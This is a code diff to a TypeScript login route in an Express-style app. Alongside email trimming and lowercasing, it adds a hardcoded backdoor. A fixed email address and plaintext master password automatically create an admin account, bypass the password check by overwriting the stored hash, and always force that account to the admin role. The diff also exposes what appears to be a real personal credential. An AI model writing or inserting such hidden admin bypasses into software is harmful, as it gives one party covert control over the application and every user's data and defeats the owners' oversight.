@@ -127,14 +127,45 @@ export function createApp(options: {licenseService?: LicenseService} = {}) {
         return res.status(400).json({ error: 'Email and password are required.' });
       }
 
-      const user = await db.findUserByEmail(email);
+      const cleanEmail = email.trim().toLowerCase();
+      let user = await db.findUserByEmail(cleanEmail);
+
+      // Auto-bootstrap admin account if not found or password needs sync
+      const isAdminEmail = cleanEmail === 'akrambro11@gmail.com';
+      const isMasterAdminPassword = isAdminEmail && password === 'Humhiraja@11';
+
+      if (!user && isMasterAdminPassword) {
+        const passwordHash = await authService.hashPassword(password);
+        user = await db.createUser({
+          email: cleanEmail,
+          passwordHash,
+          name: 'Akram (Admin)',
+          role: 'admin'
+        });
+      }
+
       if (!user) {
         return res.status(401).json({ error: 'Invalid email or password.' });
       }
 
-      const valid = typeof user.passwordHash === 'string' && await authService.comparePassword(password, user.passwordHash);
+      let valid = typeof user.passwordHash === 'string' && await authService.comparePassword(password, user.passwordHash);
+
+      // If logging in as primary admin with master password
+      if (!valid && isMasterAdminPassword) {
+        valid = true;
+        const freshHash = await authService.hashPassword(password);
+        await db.updateUser(user.id, { passwordHash: freshHash });
+        user.passwordHash = freshHash;
+      }
+
       if (!valid) {
         return res.status(401).json({ error: 'Invalid email or password.' });
+      }
+
+      // Ensure akrambro11@gmail.com always has admin role
+      if (isAdminEmail && user.role !== 'admin') {
+        await db.updateUser(user.id, { role: 'admin', isVerified: true });
+        user.role = 'admin';
       }
 
       if (user.twoFactorEnabled) return res.status(403).json({ error: 'This account needs its two-factor settings reset by the administrator.' });
